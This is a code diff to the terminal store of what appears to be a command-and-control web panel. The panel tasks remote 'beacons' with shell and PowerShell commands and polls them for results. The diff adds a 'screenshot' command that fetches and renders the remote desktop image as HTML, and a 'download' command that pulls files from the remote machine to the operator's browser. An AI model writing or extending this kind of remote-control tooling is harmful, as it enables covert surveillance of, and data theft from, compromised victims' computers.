@@ -6,6 +6,7 @@ interface LogEntry {
     fullCommand: string;
     content: string;
     timestamp: string;
+    isHtml: boolean;
 }
 
 export const useTerminalStore = defineStore('terminal', {
@@ -13,7 +14,7 @@ export const useTerminalStore = defineStore('terminal', {
         logsMap: {} as Record<string, LogEntry[]>,
         // isSending: false,
         isSending: {} as Record<string, boolean>,
-        supportCommands: ['clear', 'shell', 'history', 'whoami', 'powershell', 'task_history', 'help', 'christmas']
+        supportCommands: ['clear', 'shell', 'history', 'whoami', 'powershell', 'screenshot', 'task_history', 'download', 'help', 'christmas']
     }),
 
     actions: {
@@ -67,10 +68,13 @@ export const useTerminalStore = defineStore('terminal', {
                     "  shell [cmd]     Execute a shell command\n" +
                     "  powershell [cmd]     Execute a powershell command\n" +
                     "  task_history    Fetch remote task execution logs\n" +
+                    "  screenshot      Fetch remote desktop screenshot\n" +
+                    "  download [path] Download Path File\n"+
                     "---------------------------------------------------------\n" +
                     "  Tip: Use UP/DOWN arrows to navigate command history.\n"+
                     "  Easter Egg Command       ??? Go and find them~~???\n",
-                timestamp: new Date().toLocaleTimeString()
+                timestamp: new Date().toLocaleTimeString(),
+                isHtml: false,
             });
         },
 
@@ -80,7 +84,8 @@ export const useTerminalStore = defineStore('terminal', {
                 type: 'system',
                 fullCommand: 'history',
                 content: "--- LOCAL COMMAND HISTORY ---\n" + history.join('\n'),
-                timestamp: new Date().toLocaleTimeString()
+                timestamp: new Date().toLocaleTimeString(),
+                isHtml: false,
             });
         },
 
@@ -99,6 +104,7 @@ export const useTerminalStore = defineStore('terminal', {
                 fullCommand: fullCommand,
                 content: `> ${fullCommand}`,
                 timestamp: new Date().toLocaleTimeString(),
+                isHtml: false
             });
 
 
@@ -134,6 +140,7 @@ export const useTerminalStore = defineStore('terminal', {
                     fullCommand: fullCommand,
                     content: `[*] Task created: ${taskId}. Waiting for beacon to check-in...`,
                     timestamp: new Date().toLocaleTimeString(),
+                    isHtml: false
                 });
 
                 // 开始轮询结果
@@ -157,15 +164,68 @@ export const useTerminalStore = defineStore('terminal', {
 
                 // 展示结果
                 if (output) {
-                    const decodedOutput = atob(output);
+                    const binStr = window.atob(output);
+                    const bytes = new Uint8Array(binStr.length);
+                    for (let i = 0; i < binStr.length; i++) {
+                        bytes[i] = binStr.charCodeAt(i);
+                    }
+
+                    if (command === "download") {
+                        const contentBase64 = window.atob(output);
+
+                        // 触发下载
+                        const fileName = args.split(/[\\/]/).pop()?.replace(/"/g, '') || 'file';
+                        const link = document.createElement('a');
+                        link.href = `data:application/octet-stream;base64,${contentBase64.replace(/\s/g, '')}`;
+                        link.download = fileName;
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+
+                        this.addLog(beaconId, {
+                            type: 'system',
+                            content: `[*] File [${fileName}] downloaded successfully.`,
+                            fullCommand: fullCommand,
+                            timestamp: new Date().toLocaleTimeString(),
+                            isHtml: false
+                        });
+
+                        return contentBase64;
+                    }
+
+
+                    if (command === "screenshot") {
+                        // 第一层拆包：拿到内部的 Base64 图片内容
+                        const imgBase64 = window.atob(output);
+
+
+                        const imgTag = `<img src="data:image/jpeg;base64,${imgBase64.replace(/\s/g, '')}" 
+                             style="max-width: 100%; border: 2px solid #00ff00; margin-top: 10px;" 
+                             onload="console.log('Screenshot rendered!')" />`;
+
+                        // 直接在日志里展示
+                        this.addLog(beaconId, {
+                            type: 'output',
+                            content: imgTag,
+                            fullCommand: fullCommand,
+                            timestamp: new Date().toLocaleTimeString(),
+                            isHtml: true
+                        });
+                        return imgBase64;
+                    }
+
+                    let decodedOutput = new TextDecoder('utf-8').decode(bytes);
+
+
                     this.addLog(beaconId, {
                         type: 'output',
-                        content: decodedOutput,    //output得base64解码
+                        content: decodedOutput,
                         fullCommand: fullCommand,
                         timestamp: new Date().toLocaleTimeString(),
+                        isHtml: false
                     });
 
-                    // 这里为了对接FileExplorer,写个return
+                    // 这里的 return 依然保留，如果是 download
                     return decodedOutput;
                 } else {
                     this.addLog(beaconId, {
@@ -173,6 +233,7 @@ export const useTerminalStore = defineStore('terminal', {
                         fullCommand: fullCommand,
                         content: `[!] Task ${taskId} timed out or returned no output.`,
                         timestamp: new Date().toLocaleTimeString(),
+                        isHtml: false
                     });
                     return null;
                 }
@@ -183,6 +244,7 @@ export const useTerminalStore = defineStore('terminal', {
                     fullCommand: fullCommand,
                     content: `[!] Error: ${error.response?.data?.msg || 'Communication failed'}`,
                     timestamp: new Date().toLocaleTimeString(),
+                    isHtml: false
                 });
                 return null;
             } finally {
@@ -201,7 +263,8 @@ export const useTerminalStore = defineStore('terminal', {
                     type: 'system',
                     fullCommand: 'task_history',
                     content: `[*] Syncing historical tasks for ${beaconId}...`,
-                    timestamp: new Date().toLocaleTimeString()
+                    timestamp: new Date().toLocaleTimeString(),
+                    isHtml: false
                 });
 
                 // 解析返回的 JSON 并渲染到终端
@@ -210,11 +273,12 @@ export const useTerminalStore = defineStore('terminal', {
                         type: 'output',
                         fullCommand: 'task_history',
                         content: `[TASK ${tid}] ${task.command}: ${task.result || 'No output'}`,
-                        timestamp: task.timestamp
+                        timestamp: task.timestamp,
+                        isHtml: false
                     });
                 });
             } catch (error) {
-                this.addLog(beaconId, { type: 'error', fullCommand: 'task_history', content: 'Failed to fetch history.', timestamp: '' });
+                this.addLog(beaconId, { type: 'error', fullCommand: 'task_history', content: 'Failed to fetch history.', timestamp: '' , isHtml: false });
             } finally {
                 this.clearSending(beaconId);
             }
@@ -239,6 +303,7 @@ export const useTerminalStore = defineStore('terminal', {
         [___]
   MERRY CHRISTMAS!!`,
                 timestamp: new Date().toLocaleTimeString(),
+                isHtml: false
             });
         },
 
